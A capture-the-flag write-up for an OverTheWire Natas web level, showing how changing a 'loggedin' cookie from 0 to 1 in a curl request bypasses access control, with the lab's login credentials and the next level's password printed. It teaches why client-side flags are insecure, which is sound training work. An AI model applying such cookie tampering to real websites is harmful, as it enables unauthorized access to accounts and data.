# 🕵️ Natas - Level 04–05 (🇺🇸 English)  
*Date:* 2025-05-24  
*Difficulty:* Easy  
*Category:* Web

---

## 🎯 OBJECTIVE

Access `http://natas5.natas.labs.overthewire.org` and retrieve the password to advance to level 6.

---

## 🔎 ANALYSIS

- After logging in with the correct credentials, the website shows the following message:
**Access denied. You are not logged in.**
- The page source contains no useful information, so we inspect the HTTP request via the browser's DevTools.
- Under the **Cookies** section, a flag draws our attention: `loggedin=0`. This indicates that the session is not authenticated.
- What happens if we change that value?

---

## 🧱 STEPS

1. We noticed the `loggedin` cookie is set to `0`, meaning the session is not authenticated.
2. We decide to change this value manually to `1`.
3. Using the terminal, we craft a request with a modified cookie header:

```
curl http://natas5.natas.labs.overthewire.org/ \  
-u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK \  
-H "Cookie: _ga=GA1.1.325147876.1747444879; _ga_RD0K2239G0=GS2.1.s1748038204\$o13\$g1\$t1748038952\$j0\$l0\$h0;  
loggedin=1"  
```
4. Upon execution, the response is: `Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

---

## 🔑 PASSWORD FOUND

```
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

---

## ✅ CONCLUSION

This level illustrates how improper cookie-based access control can be easily bypassed by modifying client-side flags.
Security decisions should never rely on modifiable client-side values like cookies without proper server-side validation.


---

## 🧪 COMMANDS USED

`curl:` Command-line tool for making HTTP requests.  
`-u:` Provides username and password in user:password format.  
`-H:` Adds a custom header — in this case, a manipulated Cookie.  

---

## 🧠 NOTES

Using cookies like loggedin=1 for access control is extremely insecure. Any attacker can modify this value manually using curl, browser dev tools, or tools like Burp Suite.
In real-world applications, authentication and access control must be handled on the server side, using signed tokens or sessions that cannot be forged on the client.

---


<p align="center">
  <a href="../Natas03-04/Readme-US.md">⬅️ Previous/a> • 
  <a href="../Natas05-06/Readme-US.md"> Next ➡️/a>
</p>
